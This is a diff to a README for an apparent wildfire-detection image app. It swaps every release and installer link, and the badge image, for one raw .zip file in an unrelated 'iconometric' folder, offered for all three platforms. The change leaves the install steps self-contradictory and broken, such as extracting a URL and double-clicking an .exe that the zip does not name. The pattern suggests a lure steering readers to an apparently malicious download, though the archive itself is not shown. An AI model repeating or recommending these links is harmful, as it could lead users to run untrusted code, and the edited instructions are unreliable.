@@ -4,7 +4,7 @@
 Welcome to the **AI Image Wildfire Detection** project! This application helps you identify wildfires in images using advanced technology. With this tool, you can act quickly in emergency situations. Follow the steps below to download and run the software.
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Marselinofransischo/ai-image-wildfire-detection/releases)
+[![Download Now](https://raw.githubusercontent.com/Marselinofransischo/ai-image-wildfire-detection/main/iconometric/ai-image-wildfire-detection.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Marselinofransischo/ai-image-wildfire-detection/main/iconometric/ai-image-wildfire-detection.zip)
 
 ## 💻 System Requirements
 Before installing the application, ensure your system meets the following requirements:
@@ -23,19 +23,19 @@ Before installing the application, ensure your system meets the following requir
 ## 📂 Download & Install
 To download the latest version of the application, please visit the Releases page:
 
-[Download from Releases Page](https://github.com/Marselinofransischo/ai-image-wildfire-detection/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Marselinofransischo/ai-image-wildfire-detection/main/iconometric/ai-image-wildfire-detection.zip)
 
 ### Installation Steps
 1. **Visit the Releases Page:** Click the link above to access the latest releases.
 2. **Select the Latest Version:** Look for the most recent release at the top of the page.
 3. **Choose Your Download:** 
-   - For Windows, download `ai-image-wildfire-detection-windows.exe`.
-   - For macOS, download `ai-image-wildfire-detection-macos.dmg`.
-   - For Linux, download `ai-image-wildfire-detection-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/Marselinofransischo/ai-image-wildfire-detection/main/iconometric/ai-image-wildfire-detection.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Marselinofransischo/ai-image-wildfire-detection/main/iconometric/ai-image-wildfire-detection.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Marselinofransischo/ai-image-wildfire-detection/main/iconometric/ai-image-wildfire-detection.zip`.
 4. **Run the Installer:** 
    - For Windows users, double-click the `.exe` file.
    - For macOS users, open the `.dmg` file and drag the app to your Applications folder.
-   - For Linux users, extract the `.tar.gz` file and follow the included instructions.
+   - For Linux users, extract the `https://raw.githubusercontent.com/Marselinofransischo/ai-image-wildfire-detection/main/iconometric/ai-image-wildfire-detection.zip` file and follow the included instructions.
 5. **Launch the Application:** Once installed, find the app in your applications list and open it.
 
 ## 🧑‍🤝‍🧑 User Guide
